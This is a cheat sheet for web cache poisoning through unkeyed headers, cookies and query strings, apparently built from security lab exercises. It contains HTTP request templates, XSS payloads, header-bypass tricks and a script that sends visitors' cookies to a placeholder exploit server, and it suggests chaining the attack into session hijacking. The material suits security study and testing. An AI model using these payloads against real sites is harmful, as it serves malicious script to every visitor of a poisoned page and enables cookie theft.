# Web cache poisoning - Unkeyed inputs (headers, cookies, query strings)

An "unkeyed input" is any request attribute that changes the response but is excluded from the cache key. Injecting a malicious value via an unkeyed header, cookie, or query parameter causes the cache to store the poisoned response and serve it to every subsequent user whose request matches the (clean) cache key.

## Quick reference
```
# Unkeyed header (X-Forwarded-Host)
GET /?cb=1234 HTTP/1.1
Host: LAB-ID.web-security-academy.net
X-Forwarded-Host: EXPLOIT-SERVER.exploit-server.net
-> response: <script src="//EXPLOIT-SERVER.exploit-server.net/resources/js/tracking.js">
# Host exploit server file: alert(document.cookie)
# Replay until X-Cache: hit -> remove cb param -> re-poison -> victim served XSS

# Unkeyed cookie
Cookie: fehost=someString"-alert(1)-"someString
-> response JS: var data = {"host":"someString"-alert(1)-"someString",...}

# Multiple headers (redirect chain)
X-Forwarded-Scheme: http
X-Forwarded-Host: EXPLOIT-SERVER
-> 302 Location: https://EXPLOIT-SERVER/resources/js/tracking.js

# Unknown header (discover with Param Miner)
X-Host: EXPLOIT-SERVER        (discovered by Param Miner Guess headers)
Vary: User-Agent              (target specific User-Agent for cache hit)

# Unkeyed query string XSS (Origin as cache buster)
GET /?evil='/><script>alert(1)</script> HTTP/1.1
Origin: x                     (Origin excluded from key, serves as buster)

# Unkeyed query parameter
GET /?utm_content='-alert(1)-' HTTP/1.1
```

## Root cause
- Caches strip or ignore certain headers/cookies (X-Forwarded-*, UTM params) before computing the cache key.
- The application still reads and reflects these inputs in the response (JS imports, JSON data, JS variables).
- Attacker-controlled value is baked into cached response; all users get the attacker's payload.

## Find it
1. **Param Miner -> Guess headers**: sends known unkeyed headers one by one, flags any that change the response.
2. Add cache buster `?cb=<n>` to isolate your tests; change `cb` each time you want a fresh origin response.
3. Watch `X-Cache: miss` vs `X-Cache: hit` - a "hit" with your payload in the body = success.
4. Check cookies: modify each cookie value; if reflected in response and `X-Cache: hit` follows, it's unkeyed.
5. For query string: add random param `?x=y` and check if `X-Cache: hit` still arrives - if yes, params are unkeyed.
6. Check `Vary` header: if `Vary: User-Agent`, the cache keys by UA -> target specific UA.

## Technique

**Unkeyed header (X-Forwarded-Host):**
1. Browse home page with Burp; locate `GET /` -> send to Repeater.
2. Add `?cb=1234` as cache buster.
3. Add `X-Forwarded-Host: example.com` -> notice `<script src="//example.com/resources/js/tracking.js">` in response.
4. Host exploit server at `/resources/js/tracking.js` with `alert(document.cookie)`.
5. Set `X-Forwarded-Host: EXPLOIT-SERVER`. Replay until `X-Cache: hit`.
6. Remove `?cb` -> replay several times to poison the un-busted key.
7. Victim visits -> cache serves response with exploit server JS import -> XSS fires.

**Unkeyed cookie:**
1. Note `fehost=prod-cache-01` cookie set on first visit; value reflected in JS.
2. Repeater: add cache buster, change `fehost=test` -> reflected -> XSS: `fehost=x"-alert(1)-"x`.
3. Replay until `X-Cache: hit` with payload visible.
4. Load URL in browser (no buster) -> alert fires.

**Multiple headers (X-Forwarded-Scheme + X-Forwarded-Host):**
1. `X-Forwarded-Scheme: http` alone -> 302 redirect to same URL with `https://`.
2. Add `X-Forwarded-Host: EXPLOIT-SERVER` -> 302 to `https://EXPLOIT-SERVER/resources/js/tracking.js`.
3. Poison `/resources/js/tracking.js` request -> all victims' browsers redirect fetch to exploit server.

**Unknown header (targeted):**
1. Param Miner on `GET /` -> discovers `X-Host` header reflected in response.
2. Note `Vary: User-Agent` in response -> cache keyed by User-Agent.
3. Send with `X-Host: EXPLOIT-SERVER` and victim's UA -> poison that UA's cache entry.
4. Deliver to victim.

**Unkeyed query string:**
1. Add random `?x=y` -> still `X-Cache: hit` on next request -> params are unkeyed.
2. Use `Origin: x` as cache buster (Origin not in key).
3. Inject: `/?evil='/><script>alert(1)</script>` -> reflected in response.
4. Replay until `X-Cache: hit` -> remove buster -> re-poison -> victim XSSed.

**Unkeyed query parameter (utm_content):**
1. Param Miner "Guess GET parameters" -> finds `utm_content` unkeyed.
2. Confirm: `?utm_content=x&cb=1` -> `X-Cache: hit` still fires on clean URL.
3. Inject: `?utm_content='-alert(1)-'` -> reflected -> cached -> victim XSSed.

## Payload arsenal
```
# Header injection
X-Forwarded-Host: EXPLOIT-SERVER.exploit-server.net
X-Host: EXPLOIT-SERVER.exploit-server.net
X-Forwarded-Scheme: http

# Cookie injection
fehost=someString"-alert(1)-"someString

# Query string XSS
?evil='/><script>alert(1)</script>
?utm_content='-alert(1)-'

# Exploit server JS payload (tracking.js)
document.write('<img src="//EXPLOIT-SERVER/'+encodeURIComponent(document.cookie)+'">')
// or simply:
alert(document.cookie)
```

## Bypasses
| Defense | Bypass |
|---|---|
| Cache validates Host | Use X-Forwarded-Host or X-Host (often not validated) |
| UTM params keyed | Use Origin header as cache buster instead of ?cb= |
| Vary: User-Agent | Match victim's UA exactly; deliver targeted link |
| X-Forwarded-Host blocked | Try X-Host, X-Forwarded-Server, X-HTTP-Host-Override |

## Exploitation walkthrough
1. **Discover**: Param Miner identifies X-Forwarded-Host is unkeyed and reflected in tracking.js `src`.
2. **Setup**: Host `/resources/js/tracking.js` on exploit server: `alert(document.cookie)`.
3. **Poison**: `GET /?cb=123` with `X-Forwarded-Host: EXPLOIT-SERVER` -> repeat until `X-Cache: hit`.
4. **Deploy**: Remove `?cb=123` -> send request several times to poison the un-busted cache entry.
5. **Profit**: Victim visits home page -> cache serves poisoned response -> tracking.js loaded from exploit server -> XSS fires.

## Chaining
- Cookie theft via XSS -> session hijack -> [Authentication](../../Authentication/)
- XSS via import -> escalate to CSRF -> [CSRF](../../CSRF/)
- Open redirect via multiple-header poison -> phishing credential capture

## Tools
- **Param Miner** (BApp) - Guess headers, Guess GET parameters
- **Burp Repeater** - replay until X-Cache: hit
- **Exploit server** - host malicious JS files

## Labs

### Web cache poisoning with an unkeyed header [Practitioner]
X-Forwarded-Host injected into tracking.js script src. Host exploit server tracking.js = `alert(document.cookie)`. Add `?cb=1` buster, set header to exploit server, replay until `X-Cache: hit`, remove buster, re-poison. Key insight: X-Forwarded-Host not in cache key but reflected in response -> every user served poisoned JS.

### Web cache poisoning with an unkeyed cookie [Practitioner]
`fehost` cookie reflected in double-quoted JS object. Inject `fehost=someString"-alert(1)-"someString`. Replay until cache hit. Key insight: cookies are frequently excluded from cache keys but still reflected in responses.

### Web cache poisoning with multiple headers [Practitioner]
`X-Forwarded-Scheme: http` -> 302 redirect. Add `X-Forwarded-Host: EXPLOIT-SERVER` -> 302 to exploit server JS URL. Poison `/resources/js/tracking.js` cache entry to redirect to exploit server. Key insight: chain two unkeyed headers to force browser to fetch JS from attacker-controlled origin.

### Targeted web cache poisoning using an unknown header [Practitioner]
Param Miner discovers `X-Host` (not X-Forwarded-Host). `Vary: User-Agent` means cache keyed by UA. Target victim's UA, poison with `X-Host: EXPLOIT-SERVER`, deliver link. Key insight: unknown unkeyed headers require discovery tools; Vary header scopes the poisoned cache entry.

### Web cache poisoning via an unkeyed query string [Practitioner]
Entire query string excluded from cache key. Use `Origin: x` as cache buster. Inject `/?evil='/><script>alert(1)</script>` -> reflected -> cached. Key insight: when query string is unkeyed, XSS in any param position is cached for ALL users requesting the clean URL.

### Web cache poisoning via an unkeyed query parameter [Practitioner]
`utm_content` parameter unkeyed (marketing param stripped before cache key). `utm_content='-alert(1)-'` reflected and cached. Key insight: individual unkeyed params (UTM, tracking) are common in analytics-heavy apps - test each one separately.

## Real-world notes
- X-Forwarded-Host is the most common unkeyed header in CDN deployments (Cloudflare, Fastly, Varnish).
- UTM parameters (`utm_source`, `utm_content`, `utm_campaign`) are almost universally excluded from cache keys.
- Always use a cache buster when testing - without it you may read a cached response from a prior test.
- `Vary` header is your friend: it tells you exactly what's in the key. A `Vary: *` response is uncacheable.
- Cookie-based poisoning is high severity but often short-lived - cookies expire and cache TTLs are short.

## References
- https://portswigger.net/web-security/web-cache-poisoning
- https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws
